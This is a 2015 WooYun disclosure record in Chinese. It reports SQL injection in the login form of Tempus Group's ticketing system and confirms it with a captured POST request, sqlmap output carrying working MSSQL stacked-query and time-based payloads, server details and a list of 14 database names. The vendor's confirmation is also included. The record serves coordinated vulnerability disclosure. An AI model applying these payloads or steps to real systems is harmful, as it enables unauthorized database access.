{"id": 30156, "wybug_id": "wooyun-2015-0117348", "wybug_title": "腾邦某系统SQL注入", "wybug_corp": "腾邦集团", "wybug_author": "天地不仁 以万物为刍狗", "wybug_date": "2015-05-31 17:52", "wybug_open_date": "2015-07-16 15:00", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-16：\t细节向公众公开  简要描述： 【HD】 以团队之名 以个人之荣耀 共建网络安全 详细说明：  上个漏洞厂商要了我的联系方式后就没动静了···看见给 茜茜公主 发了礼物  我想肯定是漏洞数不够  所以厂商没发礼物  所以又去检查了一遍 结果还真有发现出问题的是 国际票务工单系统 这个站点 http://gj.tempus.cn 凭感觉在用户名处加了个 admin'\n\n然后回车后 直接报错 \n\n有注入  直接抓包丢sqlmap 里跑一下post数据包：\nPOST /default.asp?action=login HTTP/1.1Host: gj.tempus.cnContent-Length: 41Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://gj.tempus.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 UBrowser/5.0.595.32 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://gj.tempus.cn/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: ASPSESSIONIDAAAQDSQC=FPNHHAGBKMNMPDFBHGMGLJIAtextfield=admin&textfield2=admin&submit=+\n\n\n\nPOST parameter 'textfield' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 134 HTTP(s) requests:---Place: POSTParameter: textfield    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: textfield=admin'); WAITFOR DELAY '0:0:5'--&textfield2=admin&submit=    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: textfield=admin') WAITFOR DELAY '0:0:5'--&textfield2=admin&submit=---[16:34:08] [INFO] testing Microsoft SQL Server[16:34:08] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errorsdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n] y[16:34:20] [INFO] confirming Microsoft SQL Server[16:34:31] [INFO] adjusting time delay to 4 seconds due to good response times[16:34:31] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2005\n\n\n\navailable databases [14]:[*] AdvanEmpDb[*] CobraDGServer[*] daynitom[*] master[*] model[*] msdb[*] oanew[*] Standard_Global[*] StandardCommonModule[*] tempdb[*] tgctour2010[*] trafax60[*] veetermsharelog[*] zytoa\n14个数据库 本来想查看下影响数据量多少的  后来想想还是算了  数据库证明即可   漏洞证明：     修复方案：     版权声明：转载请注明来源 天地不仁 以万物为刍狗@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-06-01 14:58 厂商回复： 感谢贵平台以及白帽子对我司的提示，我们已经组织人员积极修复中！谢谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}